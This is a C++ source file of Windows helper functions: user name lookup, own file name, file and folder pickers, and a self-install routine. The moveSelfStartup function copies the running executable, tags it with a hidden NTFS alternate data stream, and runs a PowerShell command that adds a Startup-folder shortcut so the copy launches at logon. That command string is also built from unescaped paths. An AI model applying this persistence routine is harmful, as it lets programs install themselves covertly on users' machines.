#include <windows.h>
#include <iostream>
#include <fstream>

//For username
#include <Lmcons.h>
//

//For selfName
#include <shlwapi.h>
//

//For selectFolder
#include <shlobj.h>
//

//Compiler linkers: -s -static-libstdc++ -static-libgcc -static  -luser32 -lshlwapi -lole32 -lcomdlg32

std::string gsfcp(const char* s) { return std::string(s); }

bool access_(std::string path) {
    std::ifstream file(path);
    if (!file.is_open()) {
        return false;
    }
    file.close();
    return true;
}

extern "C" const char* __cdecl getUName() {
    WCHAR username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserNameW(username, &username_len);

    int requiredSize = WideCharToMultiByte(CP_UTF8, 0, username, -1, nullptr, 0, nullptr, nullptr);
    char* narrowUsername = new char[requiredSize];
    WideCharToMultiByte(CP_UTF8, 0, username, -1, narrowUsername, requiredSize, nullptr, nullptr);

    return narrowUsername;
}

extern "C" const char* __cdecl getSelfName() {
    static std::string fn;
    TCHAR filename[MAX_PATH];
    GetModuleFileName(NULL, filename, MAX_PATH);
    TCHAR *filename_only = PathFindFileName(filename);
    fn = filename_only;
    return fn.c_str();
}

extern "C" std::string __cdecl selectFolder(std::string description) {
    TCHAR szDir[MAX_PATH];

    BROWSEINFO bi;
    ZeroMemory(&bi, sizeof(bi));
    bi.hwndOwner = NULL;
    bi.ulFlags = BIF_NEWDIALOGSTYLE | BIF_RETURNONLYFSDIRS;
    std::string descriptionA = description;
    bi.lpszTitle = descriptionA.c_str();
    LPITEMIDLIST pidl = SHBrowseForFolder(&bi);

    if (!pidl) { return "error"; }

    SHGetPathFromIDList(pidl, szDir);
    CoTaskMemFree(pidl);

    for (char& c : szDir) {
        if (c == '\\') {
            c = '/';
        }
    }

    std::string path = szDir;
    if (path.back() != '/') {
        path += "/";
    }
    return path;
}

extern "C" std::string __cdecl selectFile(std::string description) {
    std::string fPath;
    OPENFILENAME ofn;
    char szFile[MAX_PATH] = "";

    ZeroMemory(&ofn, sizeof(ofn));
    ofn.lStructSize = sizeof(ofn);
    ofn.hwndOwner = NULL;
    ofn.lpstrFile = szFile;
    ofn.nMaxFile = MAX_PATH;
    ofn.lpstrTitle = description.c_str();
    ofn.Flags = OFN_FILEMUSTEXIST | OFN_HIDEREADONLY;

    if (GetOpenFileName(&ofn)) {
        for (char& c : szFile) {
            if (c == '\\') {
                c = '/';
            }
        }
        std::string fPath(szFile);
        return fPath;
    }
    return "error";
}

extern "C" bool __cdecl access(const char* filePath) { return access_(gsfcp(filePath)); }
extern "C" bool __cdecl isStartup() { return (access_(std::string(getSelfName()) + ":startup")); }

extern "C" int __cdecl moveSelfStartup(const char* path_, const char* sName_) {//Use a full path (From drive letter to filder with '/' at the end!)
    std::string self = getSelfName();
    std::string path = gsfcp(path_);
    std::string sName = gsfcp(sName_);
    if (isStartup()) { return 1; }//The current file is already processed by this code. (Alternate Data Stream detected)
    std::string pStartup = "C:/Users/" + std::string(getUName()) + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/";
    std::string psCmd = "powershell.exe -Command \"& { Set-Location '" + pStartup + "'; $ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut($pwd.Path + '\\" + sName + ".lnk'); $s.TargetPath = '" + path + self + "'; $s.Save() }\"";
    std::string oneToRuleThemAll = "@echo off && type \"" + self + "\" >> \"" + path + self + "\" && echo check > \"" + path + self + ":startup\" && cd \"" + pStartup + "\" && " + psCmd + " && echo check > \"" + pStartup + sName + ".lnk:startup\"";

    system(oneToRuleThemAll.c_str());

    return 0;
}
//
